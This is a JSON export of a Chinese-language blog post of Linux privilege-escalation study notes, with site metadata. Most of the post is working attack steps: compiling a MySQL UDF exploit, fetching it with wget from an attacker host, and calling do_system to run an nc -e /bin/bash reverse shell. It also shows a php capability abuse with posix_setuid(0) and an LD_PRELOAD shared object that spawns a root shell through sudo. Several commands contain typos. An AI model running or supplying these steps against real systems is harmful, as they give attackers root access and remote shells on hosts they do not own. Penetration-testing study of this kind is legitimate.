{"title":"linux提权-2","uid":"6403e95da46f7fd7b263376c68990666","slug":"linux提权-2","date":"2025-06-04T15:50:46.417Z","updated":"2025-06-05T16:55:53.682Z","comments":true,"path":"api/articles/linux提权-2.json","cover":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/Follow%20me%20for%20more%21%20%23genshin%20%23genshinimpact.jpg","content":"<h1 id=\"linux提权-2\"><a href=\"#linux提权-2\" class=\"headerlink\" title=\"linux提权-2\"></a>linux提权-2</h1><h2 id=\"数据库提权\"><a href=\"#数据库提权\" class=\"headerlink\" title=\"数据库提权\"></a>数据库提权</h2><p>Mysql提权方式：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">编译UDF.so</span></span><br><span class=\"line\">searchsploit udf</span><br><span class=\"line\">cp /usr/share/exploitdb/exploits/linux/local/1518.c .</span><br><span class=\"line\">gcc -g -shared -WL,-soname,1518.so -o udf.so 1518.c -1c</span><br><span class=\"line\">python -m http.server 8080</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class=\"line\">cd /tmp</span><br><span class=\"line\">wget http://192.168.200.1:8080/udf.so</span><br></pre></td></tr></table></figure>\n<p>连接进行导出调用</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">mysql -u账号 -p密码</span><br><span class=\"line\">seletc version();</span><br><span class=\"line\">select @@basedir;     #确认mysql安装位置</span><br><span class=\"line\">show variavles like &#x27;%basedir%&#x27;;     #确认mysql安装位置</span><br><span class=\"line\">show variables like &#x27;%secure%&#x27;;      #查看可导出文件的位置</span><br><span class=\"line\">show variables like &#x27;%plugin%&#x27;;      #查看插件位置</span><br><span class=\"line\">show variables like &#x27;%compile%&#x27;;     #查看系统版本</span><br><span class=\"line\">use mysql;</span><br></pre></td></tr></table></figure>\n<p>show variables like ‘%secure%’;&#x2F;&#x2F;查看可导出文件的位置这条命令执行后，查看secure_file_priv 是否开启，如果开启，将无法写入文件，则无法提权<br><img src=\"https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-05%20001749.png\"></p>\n<p>创建shell表</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">create table shell(line blob);</span><br></pre></td></tr></table></figure>\n<p>往shell表中插入二进制的 udf.so</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">insert into shell values(load_file(&#x27;/tmp/udf.so&#x27;));</span><br></pre></td></tr></table></figure>\n<p>导出 udf.so</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">select * from shell into dumpfile &#x27;/usr/lib/mysql/plugin/udf.so&#x27;;    #将/tmp/udf.so放到/usr/lib/mysql/plugin/中</span><br></pre></td></tr></table></figure>\n<p>创建do_system函数</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">create function do_system returns integer soname &#x27;udf.so&#x27;;</span><br><span class=\"line\">select do_system(&#x27;nc 192.168.200.6 6666 -e /bin/bash&#x27;);</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Capability\"><a href=\"#Capability\" class=\"headerlink\" title=\"Capability\"></a>Capability</h2><p>相当于SUID的升级版</p>\n<p>可以理解为水平权限的分离。以往如果需要某个程序的某个功能需要特权，我们就只能使用root来执行或者给其增加SUID权限，一旦这样，我们等于赋予了这个程序所有的特权，这是不满足权限最小化的要求的；在引入capabilities后，root的权限被分隔成很多子权限，这就避免了滥用特权的问题</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">cp /usr/bin/php /tmp/php</span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">设置特权</span></span><br><span class=\"line\">setcap cap_setuid+epp /tmp/php   #将/tmp/php设置特权为setuid</span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">删除特权</span></span><br><span class=\"line\">setcap -r /tmp/php</span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">查看单个特权</span></span><br><span class=\"line\">getcap /usr/bin/php</span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">查看所有特权</span></span><br><span class=\"line\">getcap -r / 2&gt;/dev/null</span><br><span class=\"line\">/sbin/getcap -r / 2&gt;/dev/null</span><br></pre></td></tr></table></figure>\n<p>1，SUID利用</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">cp $(which php) .</span><br><span class=\"line\">sudo setcap cap_setuid+ep php</span><br><span class=\"line\"></span><br><span class=\"line\">./php -r &quot;posix_setuid(0); system(&#x27;/bin/sh&#x27;);&quot;</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-05%20235807.png\"><br>前者为程序，后者为特权，如果特权足够大，将会导致提权<br>2，进程注入<br><img src=\"https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-06%20001125.png\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">usr/bin/python2.7 = cap_sys_ptrace+ep</span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">cap_sys_ptrace表示允许跟踪进程</span></span><br></pre></td></tr></table></figure>\n<p>利用方法：<br>利用usr&#x2F;bin&#x2F;python2.7去跟踪一个root权限的进程，来获取权限<br>所以需要写一个进程注入脚本</p>\n<h2 id=\"LD-Preload加载\"><a href=\"#LD-Preload加载\" class=\"headerlink\" title=\"LD_Preload加载\"></a>LD_Preload加载</h2><p>LD_Preload是linux系统的一个环境变量，它可以影响程序的运行时的链接，它允许你定义在程序前优先加载的动态链接库，所谓的动态链接库其实就是DLL文件（linux为SO文件）<br>利用原理：<br>因为允许你定义在程序前优先加载的动态链接库，所以自己写一个so文件，让其加载</p>\n<p>在etc&#x2F;sudoers文件中存在两个信息</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">DEfaults        env_keep += LD_PRELOAD  #设置LD_Preload权限的开启</span><br><span class=\"line\">test    ALL=(ALL:ALL) NOPASSWD: /usr/bin/find   #普通用户sudo的执行权限</span><br></pre></td></tr></table></figure>\n<p><strong>注意</strong>：这里&#x2F;usr&#x2F;bin&#x2F;find可以是任何文件，也可能是第三方文件，如果真是find，那么就不会用到此提权手法了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//shell.c</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/types.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">void</span> _init()&#123;</span><br><span class=\"line\">    unsetenv(<span class=\"string\">&quot;LD_PRELOAD&quot;</span>);</span><br><span class=\"line\">    setgid(<span class=\"number\">0</span>);</span><br><span class=\"line\">    setuid(<span class=\"number\">0</span>);</span><br><span class=\"line\">    system(<span class=\"string\">&quot;/bin/sh&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>编译</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">gcc -fPIC -shared -o shell.so shell.c -nostartfiles</span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">同样在Windows操作系统中使用.dll文件</span></span><br><span class=\"line\">ls -al shell.so</span><br><span class=\"line\">sudo LD_PRELOAD=/tmp/shell.so find</span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">让find执行时绑定shell.so</span></span><br><span class=\"line\">id</span><br><span class=\"line\">whoami</span><br></pre></td></tr></table></figure>\n<p>相当于sudo提权的升级版</p>\n","text":"linux提权-2数据库提权Mysql提权方式： #编译UDF.sosearchsploit udfcp /usr/share/exploitdb/exploi...","permalink":"/post/linux提权-2","photos":[],"count_time":{"symbolsCount":"2.5k","symbolsTime":"2 mins."},"categories":[{"name":"linux提权","slug":"linux提权","count":2,"path":"api/categories/linux提权.json"}],"tags":[{"name":"linux提权","slug":"linux提权","count":2,"path":"api/tags/linux提权.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#linux%E6%8F%90%E6%9D%83-2\"><span class=\"toc-text\">linux提权-2</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83\"><span class=\"toc-text\">数据库提权</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Capability\"><span class=\"toc-text\">Capability</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#LD-Preload%E5%8A%A0%E8%BD%BD\"><span class=\"toc-text\">LD_Preload加载</span></a></li></ol></li></ol>","author":{"name":"Hao","slug":"blog-author","avatar":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/64966b30e1c9375e8dbb11146ea9c12f.jpg","link":"/","description":"山高自有客行路，水深自有渡船认 The future is like the sea and three will be a long time to come","socials":{"github":"https://github.com/isMyHao","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/","csdn":"https://blog.csdn.net/2401_87971103?spm=1000.2115.3001.10640","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"Java安全学习路径","uid":"7c3e14f0681c54989a322aaf4933843e","slug":"Java安全学习路线","date":"2025-05-17T07:27:11.184Z","updated":"2025-05-17T09:15:50.655Z","comments":true,"path":"api/articles/Java安全学习路线.json","cover":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%23chudia%20%23anime%20%23wataa%20%23girl%20%23wlw.jpg","text":"参考文章： https://github.com/HackJava/HackJava ","permalink":"/post/Java安全学习路线","photos":[],"count_time":{"symbolsCount":43,"symbolsTime":"1 mins."},"categories":[{"name":"Java安全","slug":"Java安全","count":4,"path":"api/categories/Java安全.json"}],"tags":[{"name":"Java安全","slug":"Java安全","count":4,"path":"api/tags/Java安全.json"}],"author":{"name":"Hao","slug":"blog-author","avatar":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/64966b30e1c9375e8dbb11146ea9c12f.jpg","link":"/","description":"山高自有客行路，水深自有渡船认 The future is like the sea and three will be a long time to come","socials":{"github":"https://github.com/isMyHao","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/","csdn":"https://blog.csdn.net/2401_87971103?spm=1000.2115.3001.10640","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"linux提权-1","uid":"2eb261c391a60e94d2f9b69f931a84fb","slug":"linux提权-1","date":"2025-06-03T15:12:37.974Z","updated":"2025-06-04T16:29:54.096Z","comments":true,"path":"api/articles/linux提权-1.json","cover":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/a76060269e0619c044dc392a6fc9b999.jpg","text":"linux提权-1《Linux提权方法论》https://github.com/Getshell/LinuxTQ提权网站：https://gtfobins.gi...","permalink":"/post/linux提权-1","photos":[],"count_time":{"symbolsCount":"6.2k","symbolsTime":"6 mins."},"categories":[{"name":"linux提权","slug":"linux提权","count":2,"path":"api/categories/linux提权.json"}],"tags":[{"name":"linux提权","slug":"linux提权","count":2,"path":"api/tags/linux提权.json"}],"author":{"name":"Hao","slug":"blog-author","avatar":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/64966b30e1c9375e8dbb11146ea9c12f.jpg","link":"/","description":"山高自有客行路，水深自有渡船认 The future is like the sea and three will be a long time to come","socials":{"github":"https://github.com/isMyHao","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/","csdn":"https://blog.csdn.net/2401_87971103?spm=1000.2115.3001.10640","juejin":"","customs":{}}}}}